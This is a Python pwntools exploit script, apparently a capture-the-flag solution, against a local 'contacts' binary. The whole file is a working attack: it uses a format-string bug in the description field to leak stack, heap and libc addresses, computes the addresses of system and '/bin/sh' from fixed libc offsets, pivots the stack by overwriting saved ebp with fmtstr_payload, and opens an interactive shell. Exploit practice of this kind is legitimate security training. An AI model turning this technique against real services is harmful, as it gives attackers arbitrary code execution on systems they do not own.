from pwn import*
from LibcSearcher import LibcSearcher
#context.log_level ='debug'
io = process('./contacts')
io.recv()
def create(name, phone, number, payload):
    print('$$$$$$$$$$$$$$$$$$$$$$$$')
    io.sendline('1')
    io.recvuntil('Name:')
    io.sendline(name)
    io.recvuntil('Enter Phone No:')
    io.sendline(phone)
    io.recvuntil('Length of description:')
    io.sendline(number)
    io.recvuntil('Enter description:')
    io.sendline(payload)
    io.recv()

def display():
    io.sendline('4')
    


create('111', '234324234', '200',b'%11$p.%6$p.%31$p.aaaa')
display()
data = io.recvuntil('aaaa')
print(data)
data = data.split(b"Description:")[1].split(b'.')
ebp_addr = int(data[0],16)
heap_addr = int(data[1],16)
__libc_start_main_address = int(data[2],16)
print(data[0],data[1],data[2])
print("[*] ebp addr is ", hex(ebp_addr))
print("[*] heap_addr is ", hex(heap_addr))
print("[*] start_main is ",hex(__libc_start_main_address))

__libc_start_main_address  -= 247

offset_system = 0x0003a950
offset_str_bin_sh = 0x15912b
offset___libc_start_main = 0x00018550
libc_base = __libc_start_main_address -offset___libc_start_main

system_address =libc_base + offset_system
bin_sh = libc_base + offset_str_bin_sh
print('[*] __libc_start_main_address is', hex(__libc_start_main_address))
print('[*] libc base is', hex(libc_base))
print('[*] system_address is', hex(system_address))
print('[*] bin_sh is', hex(bin_sh))

payload = flat([system_address,0xdeadbeef,bin_sh,'aaaa'])
create('222', '234324234', '200',payload)
display()
io.recv()
'''
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
'''
payload=fmtstr_payload(6,{ebp_addr:heap_addr-12})
create('333', '234324234', '200',payload)
display()
io.recvuntil('>>> ')
io.sendline('5')
io.interactive()










